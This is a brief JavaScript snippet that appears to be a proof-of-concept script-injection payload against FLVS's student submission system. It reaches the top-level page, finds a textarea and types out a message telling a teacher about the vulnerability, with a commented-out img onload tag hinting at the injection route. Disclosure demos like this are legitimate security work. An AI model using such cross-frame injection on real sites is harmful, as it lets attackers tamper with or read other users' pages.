
// <img onload="" width="1px" height="1px" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQwJt3NP0PTKrWSYtcxWlTcK5H7plhdwe9B6g&usqp=CAU" >

const doc = window.top.document;

const textArea = doc.querySelector("textarea[dir=\"ltr\"]");

const message = "Hello Mrs. Rakestraw. I have found a strange vulnerability in FLVS's student submission system.";

let idx = 1;

let interval = setInterval(() => {

    const normalMessage = idx>0?message.substr(0, idx):"";

    // const highlightedCharacter = message[idx];
    // const textHTML = "<p>" + normalMessage + "<span style=\"background-color: green\">" + highlightedCharacter + "</span></p>";

    textArea.innerHTML = normalMessage;

    idx ++;

    if (idx >= message.length) clearInterval(interval);

}, 500);
